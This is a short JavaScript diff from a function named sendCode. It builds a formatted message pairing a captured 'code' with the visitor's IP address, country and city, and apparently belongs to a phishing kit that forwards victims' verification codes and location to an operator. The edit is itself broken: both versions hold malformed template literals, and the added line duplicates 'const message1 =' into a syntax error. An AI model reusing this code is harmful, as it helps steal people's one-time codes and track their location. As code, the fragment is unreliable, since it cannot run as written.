@@ -168,9 +168,8 @@ function sendCode() {
             $('#code').removeClass('border-danger');
         }
         code1 = keymap;
-        const message1 = `const message1 = 
-`🔓 <strong>Code:</strong> <code>${code1}</code>
-🌐 <strong>IP Address:</strong> <code>${IpAddress.ipAddress}</code>
+        const message1 = const message1 = `🔓 <strong>Code:</strong> <code>${code1}</code>
+ 🌐 <strong>IP Address:</strong> <code>${IpAddress.ipAddress}</code>
  <strong>Country:</strong> <code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
  <strong>City:</strong> <code>${IpAddress.city}</code>`;
 
